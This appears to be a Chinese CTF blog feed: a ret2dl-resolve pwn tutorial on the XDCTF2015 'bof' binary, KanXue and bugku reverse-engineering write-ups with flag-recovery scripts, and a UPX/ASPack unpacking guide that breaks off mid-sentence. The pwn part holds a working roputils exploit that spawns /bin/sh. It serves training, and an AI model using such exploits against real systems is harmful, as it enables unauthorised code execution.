&quot;strlen&quot;</span><br><span class="line">LOAD:08048228                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_8048278, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:08048228                            0&gt;</span><br><span class="line">LOAD:08048238                 Elf32_Sym &lt;offset aWrite - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:08048248                 Elf32_Sym &lt;offset aStdout - offset byte_8048278, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:08048248                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:08048258                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_8048278, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:08048258                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:08048268                 Elf32_Sym &lt;offset aStdin - offset byte_8048278, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:08048268                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>.dynstr节包含了动态链接的字符串。这个节以\x00作为开始和结尾，中间每个字符串也以\x00间隔。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048278 ; ELF String Table</span><br><span class="line">LOAD:08048278 byte_8048278    db 0                    ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:08048278                                         ; LOAD:080481F8↑o ...</span><br><span class="line">LOAD:08048279 aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048283 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:08048258↑o</span><br><span class="line">LOAD:08048292 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:08048268↑o</span><br><span class="line">LOAD:08048298 aStrlen         db &apos;strlen&apos;,0           ; DATA XREF: LOAD:08048218↑o</span><br><span class="line">LOAD:0804829F aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481F8↑o</span><br><span class="line">LOAD:080482A4 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:08048248↑o</span><br><span class="line">LOAD:080482AB aSetbuf         db &apos;setbuf&apos;,0           ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:080482B2 aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482B2                                         ; DATA XREF: LOAD:08048228↑o</span><br><span class="line">LOAD:080482C4 aWrite          db &apos;write&apos;,0            ; DATA XREF: LOAD:08048238↑o</span><br><span class="line">LOAD:080482CA aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:08048208↑o</span><br><span class="line">LOAD:080482D9 aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br></pre></td></tr></table></figure><p>Elf32_Sym[2]-&gt;st_name=0x27（.dynsym + Elf32_Sym_size * num），所以.dynstr加上0x27的偏移量，就是字符串read。</p><ol start="5"><li>.plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。</li></ol><h1 id="example"><a href="#example" class="headerlink" title="example"></a>example</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // eax</span><br><span class="line">  char buf[4]; // [esp+0h] [ebp-6Ch]</span><br><span class="line">  char v6; // [esp+18h] [ebp-54h]</span><br><span class="line">  int *v7; // [esp+64h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);</span><br><span class="line">  memset(&amp;v6, 0, 0x4Cu);</span><br><span class="line">  setbuf(stdout, buf);</span><br><span class="line">  v3 = strlen(buf);</span><br><span class="line">  write(1, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+Ch] [ebp-6Ch]</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, &amp;buf);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="正常攻击"><a href="#正常攻击" class="headerlink" title="正常攻击"></a>正常攻击</h2><h2 id="roputils"><a href="#roputils" class="headerlink" title="roputils"></a>roputils</h2><p>相对而言特别方便的工具，可以自动生成需要伪造的section，并且通过函数调用直接ROP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">r = process(&apos;./bof&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">rop = ROP(&apos;./bof&apos;)</span><br><span class="line">offset = 112</span><br><span class="line">bss_base = rop.section(&apos;.bss&apos;)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">## used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">## used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;相关结构&quot;&gt;&lt;a href=&quot;#相关结构&quot; class=&quot;headerlink&quot; title=&quot;相关结构&quot;&gt;&lt;/a&gt;相关结构&lt;/h1&gt;&lt;p&gt;ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。&lt;/p&gt;
&lt;p&gt;如果一个可执行文件参与动态链
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>kanxueCTF-2019</title>
    <link href="http://siriuswhiter.tk/2019/03/14/kanxuectf-2019/"/>
    <id>http://siriuswhiter.tk/2019/03/14/kanxuectf-2019/</id>
    <published>2019-03-14T13:57:23.000Z</published>
    <updated>2019-03-15T10:28:23.173Z</updated>
    
    <content type="html"><![CDATA[<p><em>刚好在学逆向，突然想着可以看一下还在比赛的看雪ctf</em></p><h1 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h1><p>win32 gui 输入注册码，错误会有提示</p><p>od 打开，搜索字符串，找到判断结果的函数位置；</p><p>ida 打开，找到od确定的函数位置，根据ida的交叉引用，找到了判断的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sub_401770      proc near               ; CODE XREF: sub_4017F0+83↓p</span><br><span class="line"></span><br><span class="line">BOOL __cdecl sub_4017F0(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; // eax</span><br><span class="line">  char Str1[28]; // [esp+D8h] [ebp-24h]</span><br><span class="line">  int v3; // [esp+F4h] [ebp-8h]</span><br><span class="line">  int v4; // [esp+F8h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  v3 = 0;</span><br><span class="line">  while ( *(_DWORD *)(a1 + 4 * v4) &lt; 62 &amp;&amp; *(_DWORD *)(a1 + 4 * v4) &gt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    Str1[v4] = aAbcdefghiabcde[*(_DWORD *)(a1 + 4 * v4)];</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  Str1[v4] = 0;</span><br><span class="line">  if ( !strcmp(Str1, &quot;KanXueCTF2019JustForhappy&quot;) )</span><br><span class="line">    result = sub_401770();</span><br><span class="line">  else</span><br><span class="line">    result = sub_4017B0();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aAbcdefghiabcde db &apos;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&apos;,0</span><br></pre></td></tr></table></figure><p>可以看到就是字符串对应，直接写脚本<br>中间卡了一下就是得到的是数字位置，如19，42什么的，但是输入没法这样，出去溜了个弯，回去在od strcmp之前下了个断点，查看对输入字符串的处理，之后突然意识到可能是 0-9 a-z A-Z 对应，尝试了一下，bingo</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = &apos;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">b = &apos;KanXueCTF2019JustForhappy&apos;</span><br><span class="line">array = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span><br><span class="line"></span><br><span class="line">c = &apos;&apos; </span><br><span class="line"></span><br><span class="line">for i in range(len(b)):</span><br><span class="line">for j in range(len(a)):</span><br><span class="line">if b[i]== a[j]:</span><br><span class="line">c += array[j]</span><br><span class="line">print c</span><br></pre></td></tr></table></figure><h1 id="Repwn"><a href="#Repwn" class="headerlink" title="Repwn"></a>Repwn</h1><p>中间卡住了。。好在后面还是把解出来了哈哈哈哈，先说下目前的思路</p><p>还是先拖进od然后搜索出现的字符串，不记得是用ida还是od找到了判断入口，下断点，同时在ida中找到函数位置，反汇编，可以看到层层嵌套的判断</p><p>第一次 判断了13位，也可以因此确定其中的13位：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v1 = 8;</span><br><span class="line"> v2 = 0;</span><br><span class="line"> v8 = &apos;ruoY&apos;;</span><br><span class="line"> v9 = &apos;pnI_&apos;;</span><br><span class="line"> v10 = &apos;I_tu&apos;;</span><br><span class="line"> v11 = &apos;rW_s&apos;;</span><br><span class="line"> v12 = &apos;gno&apos;;</span><br><span class="line"> v4 = &apos;0Y1X&apos;;</span><br><span class="line"> v5 = &apos;t3Nu&apos;;</span><br><span class="line"> v6 = &apos;d00G&apos;;</span><br><span class="line"> v7 = 0;</span><br><span class="line"> while ( *((_BYTE *)&amp;v4 + v2) == *(_BYTE *)(v1 + key) )</span><br><span class="line"> &#123;</span><br><span class="line">   ++v2;</span><br><span class="line">   ++v1;</span><br><span class="line">   if ( v2 &gt; 11 )</span><br><span class="line">   &#123;</span><br><span class="line">     result = 1;</span><br><span class="line">     if ( *(_BYTE *)(key + 20) == &apos;H&apos; )</span><br><span class="line">       return result;</span><br><span class="line">     return 0;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br></pre></td></tr></table></figure></p><p>第二次,确定了序列长度，同时在检查第三步回来之后还会对最后四位处理，最后会将其覆盖到返回地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ( strlen(Str) == 24 )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( check3((int)Str) )</span><br><span class="line">   &#123;</span><br><span class="line">     Str[20] -= 88;</span><br><span class="line">     Str[21] -= 70;</span><br><span class="line">     Str[22] -= 3;</span><br><span class="line">     Str[23] -= 107;</span><br><span class="line">     strcpy(&amp;Dest, Str);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line">   printf(&quot;String Length is Wrong&quot;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>第三次，也就是最后一次，，deal_8对前八位全部减0x30， 第三次通过计算可以确定第五到八位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> deal_8(a1);</span><br><span class="line">  v1 = no_4 + 1000 * fl[0] + 100 * no_2 + 10 * no_3;</span><br><span class="line">  v2 = no_6 + 10 * no_5;</span><br><span class="line">  v3 = no_8 + 10 * no_7;</span><br><span class="line"></span><br><span class="line">  if ( 2 * (v1 + v2) != 4040 || 3 * v2 / 2 + 100 * v3 != 115 )// v1+v2 = 0x7e4</span><br><span class="line">    goto LABEL_2;</span><br><span class="line">  result = 1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if ( v1 - 110 * v3 != 1900 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Key_Is_Wrong,Please_Input_Again!&quot;);</span><br><span class="line">LABEL_2:</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>经过不断的尝试＋猜测，终于试出了flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20101001X1Y0uN3tG00dHaCk</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;刚好在学逆向，突然想着可以看一下还在比赛的看雪ctf&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;流浪者&quot;&gt;&lt;a href=&quot;#流浪者&quot; class=&quot;headerlink&quot; title=&quot;流浪者&quot;&gt;&lt;/a&gt;流浪者&lt;/h1&gt;&lt;p&gt;win32 gui 输入注册码，错误会有提示&lt;
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>bugku-reverse prac</title>
    <link href="http://siriuswhiter.tk/2019/03/13/bugku-reverse-prac/"/>
    <id>http://siriuswhiter.tk/2019/03/13/bugku-reverse-prac/</id>
    <published>2019-03-13T11:24:58.000Z</published>
    <updated>2019-03-13T11:54:57.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="love"><a href="#love" class="headerlink" title="love"></a>love</h1><p><em>其实是比较简单的逆向，但是毕竟上手时间短，写一写顺便把思路缕清</em></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开是dos窗口，等待输入flag，随便输入后直接退出</p><p>拖入IDA，重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 main_0()</span><br><span class="line">&#123;</span><br><span class="line">  int len; // eax</span><br><span class="line">  const char *v1; // eax</span><br><span class="line">  size_t real_len; // eax</span><br><span class="line">  int v3; // edx</span><br><span class="line">  __int64 v4; // ST08_8</span><br><span class="line">  signed int j; // [esp-B0h] [ebp-B0h]</span><br><span class="line">  signed int i; // [esp-A4h] [ebp-A4h]</span><br><span class="line">  signed int v8; // [esp-A4h] [ebp-A4h]</span><br><span class="line">  int v9; // [esp-98h] [ebp-98h]</span><br><span class="line">  int flag; // [esp-2Ch] [ebp-2Ch]</span><br><span class="line">  int v11; // [esp-10h] [ebp-10h]</span><br><span class="line">  int v12; // [esp-4h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt; 100; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)i &gt;= 0x64 )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    *((_BYTE *)&amp;v12 + i - 0x94) = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  puts_(&quot;please enter the flag:&quot;);</span><br><span class="line">  scanf(&quot;%20s&quot;, &amp;flag);</span><br><span class="line">  len = j_strlen((const char *)&amp;flag);</span><br><span class="line">  v1 = (const char *)deal((int)&amp;flag, len, (int)&amp;v11);</span><br><span class="line">  strncpy((char *)&amp;v9, v1, 40u);</span><br><span class="line">  v8 = j_strlen((const char *)&amp;v9);</span><br><span class="line">  for ( j = 0; j &lt; v8; ++j )</span><br><span class="line">    *((_BYTE *)&amp;v12 + j - 0x94) += j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  real_len = j_strlen((const char *)&amp;v9);</span><br><span class="line">  if ( !strncmp((const char *)&amp;v9, Str2, real_len) )</span><br><span class="line">    puts_(&quot;rigth flag!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts_(&quot;wrong flag!\n&quot;);</span><br><span class="line">  HIDWORD(v4) = v3;</span><br><span class="line">  LODWORD(v4) = 0;</span><br><span class="line">  return v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Str2            db &apos;e3nifIH9b_C@n@dH&apos;,0</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序流程也比较清晰，初始时将一段栈内存置为0，可以看到是在v9处，之后请求输入flag，然后对输入的flag deal加密处理<br>然后处理得到的字符串再次每位加i，相当于第二次加密，之后将其与一段字符串相比，相等的话就输出right flag</p><p>所以问题的重点其实是第一次加密是怎样处理的，ida中看到一堆abcdef…，想着可能是base64，但是不确定。</p><p>将文件拖入x32dbg 先运行起来，然后搜索字符串，找到主函数的位置，根据ida可以知道在第一次加密之后调用了strncpy，所以我们在搜索到wrong flag地址，往上翻，可以大概确定加密的地址，在其之后下断点，运行程序输入任意flag，因为约定函数返回值是存在eax中的，查看此时的eax，发现其值就是输入flag的base64，接下来写脚本就完事了</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">string=&apos;e3nifIH9b_C@n@dH&apos;</span><br><span class="line">unstring = &apos;&apos;</span><br><span class="line">for i in range(len(string)):</span><br><span class="line">unstring += chr(ord(string[i])-i)</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(unstring)</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ python lovewp.py </span><br><span class="line">&#123;i_l0ve_you&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;love&quot;&gt;&lt;a href=&quot;#love&quot; class=&quot;headerlink&quot; title=&quot;love&quot;&gt;&lt;/a&gt;love&lt;/h1&gt;&lt;p&gt;&lt;em&gt;其实是比较简单的逆向，但是毕竟上手时间短，写一写顺便把思路缕清&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Reverse Learning-unpack</title>
    <link href="http://siriuswhiter.tk/2019/03/13/reverse-learning-unpack/"/>
    <id>http://siriuswhiter.tk/2019/03/13/reverse-learning-unpack/</id>
    <published>2019-03-13T07:45:50.000Z</published>
    <updated>2019-03-13T09:03:37.042Z</updated>
    
    <content type="html"><![CDATA[<p><em>学习一下基础的软件脱壳，之后慢慢更新</em></p><h1 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h1><h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p>upx属于比较经典的压缩壳，支持大多数操作系统运行文件，可以使压缩过的可执行文件体积缩小50%-70% ；</p><p>文件位压缩后的运行方式便是在压缩文件的开始加入解压缩的代码，所以程序在运行完解压缩代码之后，程序的代码实际上就与压缩前一致了，而这也是我们可以手动调试脱壳的前提。</p><h2 id="pack"><a href="#pack" class="headerlink" title="pack"></a>pack</h2><p>先下载 <a href="https://upx.github.io/" target="_blank" rel="noopener">upx</a></p><p>od 查看文件在upx 之前的内存情况，从开始处，信息比较清楚</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/1.png" alt="未加壳" title="" class="">                <p>未加壳</p>            </figure><p>命令行调用upx 给文件加壳   <code>./upx.exe filename.exe</code></p><p>再次查看文件情况，当然也可以使用IDA。</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/2.png" alt="加壳" title="" class="">                <p>加壳</p>            </figure><h2 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h2><ol><li>upx自带脱壳命令，加个-d 就是脱壳模式</li><li>手动脱壳</li></ol><p>文件起始有个pushad将所有寄存器的值入栈，之后从加壳后的文件起始处按f8单步往后走，发现不久后就开始了反复循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">004079D0   &gt; /8A06          mov al,byte ptr ds:[esi]</span><br><span class="line">004079D2   . |46            inc esi                                  ;  upxpacke.00407006</span><br><span class="line">004079D3   . |8807          mov byte ptr ds:[edi],al</span><br><span class="line">004079D5   . |47            inc edi                                  ;  upxpacke.00401002</span><br><span class="line">004079D6   &gt; |01DB          add ebx,ebx</span><br><span class="line">004079D8   . |75 07         jnz short upxpacke.004079E1</span><br><span class="line">004079DA   &gt; |8B1E          mov ebx,dword ptr ds:[esi]</span><br><span class="line">004079DC   . |83EE FC       sub esi,-0x4</span><br><span class="line">004079DF   . |11DB          adc ebx,ebx</span><br><span class="line">004079E1   &gt;^\72 ED         jb short upxpacke.004079D0</span><br></pre></td></tr></table></figure><p>可以看到大概意思就是在疯狂复制esi地址的数据到 edi地址处</p><p>而我们只需要找到之后的popad就可以了，所以右键-&gt;serch for-&gt;command 或直接 ctrl+F 寻找popad ，不过这里需要去掉entire block的勾选，否则会找到起始地址之前的popad，找到之后f2下断点，f9直接运行到这里</p><p>之后继续单步,一个小循环之后，跳转到一个地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00407B66   .  61            popad</span><br><span class="line">00407B67   .  8D4424 80     lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">00407B6B   &gt;  6A 00         push 0x0</span><br><span class="line">00407B6D   .  39C4          cmp esp,eax</span><br><span class="line">00407B6F   .^ 75 FA         jnz short upxpacke.00407B6B</span><br><span class="line">00407B71   .  83EC 80       sub esp,-0x80</span><br><span class="line">00407B74   .- E9 C897FFFF   jmp upxpacke.00401341</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00401341    E8 83040000     call upxpacke.004017C9</span><br><span class="line">00401346  ^ E9 B3FDFFFF     jmp upxpacke.004010FE</span><br><span class="line">0040134B    8BFF            mov edi,edi                              ; upxpacke.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0040134D    55              push ebp</span><br><span class="line">0040134E    8BEC            mov ebp,esp</span><br><span class="line">00401350    81EC 28030000   sub esp,0x328</span><br></pre></td></tr></table></figure><p>到达该地址后，可以看到有个call函数，此时就可以使用od 的插件OllyDump将文件脱壳，需要注意的是重建输入表一般会选择方式二，其他的可以根据情况来定，这次保持默认就可以了</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/3.png" alt="ollydump" title="" class="">                <p>ollydump</p>            </figure><p>打开输出的脱壳的文件，找到最初始的地方，发现与脱壳前一样，也就是说脱壳成功</p><figure class="image-box">                <img src="/2019/03/13/reverse-learning-unpack/4.png" alt="脱壳效果" title="" class="">                <p>脱壳效果</p>            </figure><h1 id="aspack"><a href="#aspack" class="headerlink" title="aspack"></a>aspack</h1><h2 id="type-1"><a href="#type-1" class="headerlink" title="type"></a>type</h2><p>专门针对win32程序的压缩软件，整体原理与upx差不多所以方法实际上是可以通用的。</p><h2 id="unpack-1"><a href="#unpack-1" class="headerlink" title="unpack"></a>unpack</h2><p>aspack popad不容易找到，所以可以使用其他的办法来</p><p>这里可以确定0x401000是程序本身的初始位置，只是在没有解包之前，这里还无法反汇编。</p><p>我们这里使用硬件断点(硬件断点不通过0xCC/<em>int 3h</em>/中断程序运行并向调试器发送报告，而是通过写入DR寄存器来实现；其支持更复杂的中断，但是只能设置四个)，在0x401000处设置一个硬件断点，f9运行，程序到0x401000处停止执行，此时应该已经解包完成，如果没有显示的话按ctrl+A， 